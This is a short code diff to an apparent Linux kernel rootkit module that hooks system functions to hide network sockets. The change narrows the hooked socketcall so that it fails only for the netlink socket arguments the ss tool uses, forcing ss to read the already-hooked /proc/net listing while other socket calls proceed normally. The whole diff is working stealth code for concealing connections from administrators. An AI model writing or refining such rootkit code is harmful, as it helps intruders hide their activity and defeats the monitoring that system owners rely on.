@@ -3,6 +3,7 @@
 #include <net/tcp.h>
 #include <net/udp.h>
 #include <net/inet_sock.h>
+#include <linux/socket.h>
 #include "sysmap.h"          /* Pointers to system functions */
 #include "global.h"
 
@@ -68,8 +69,11 @@ static int hooked_tcp_show(struct seq_file* file, void* v){
 }
 
 asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
+    // when a socket gets opened with exaclty the arguments which ss uses, return -1
     // returning -1 causes ss to try it via /proc/net, which we already hooked
-    return -1;
+    if(call == SYS_SOCKET && args[0] == AF_NETLINK && args[1] == SOCK_RAW && args[2] == NETLINK_INET_DIAG)
+        return -1;
+    return orig_socketcall(call, args);
 }
 
 void hide_sockets(void){
